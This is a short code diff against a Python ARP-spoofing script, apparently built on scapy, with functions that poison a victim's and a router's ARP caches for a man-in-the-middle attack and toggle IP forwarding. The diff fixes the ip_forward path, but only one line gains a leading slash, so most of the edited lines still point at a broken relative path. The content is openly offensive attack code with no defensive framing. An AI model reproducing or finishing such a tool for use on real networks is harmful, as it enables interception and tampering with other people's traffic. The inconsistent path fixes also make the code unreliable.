@@ -28,7 +28,7 @@ def reARP(victimIP, routerIP, interface):
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))
 
     
-    os.system("echo 0 > proc/sys/ipv4/ip_forward")
+    os.system("echo 0 > proc/sys/net/ipv4/ip_forward")
  
  
 def attack(victimIP, victimMAC, routerIP, routerMAC):
@@ -40,17 +40,17 @@ def attack(victimIP, victimMAC, routerIP, routerMAC):
 def manInTheMiddle():
     
     info = getInfo() #list
-    os.system("echo 1 > proc/sys/ipv4/ip_forward")
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
     try:
         victimMAC = get_MAC(info[1], info[0])
     except Exception:
-        os.system("echo 0 > proc/sys/ipv4/ip_forward")
+        os.system("echo 0 > proc/sys/net/ipv4/ip_forward")
         sys.exit(1)
     try:
         routerMAC = get_MAC(info[2], info[0])
     except Exception:
-        os.system("echo 0 > proc/sys/ipv4/ip_forward")
+        os.system("echo 0 > proc/sys/net/ipv4/ip_forward")
         sys.exit(1)
 
     print("Victim MAC: %s" % victimMAC)
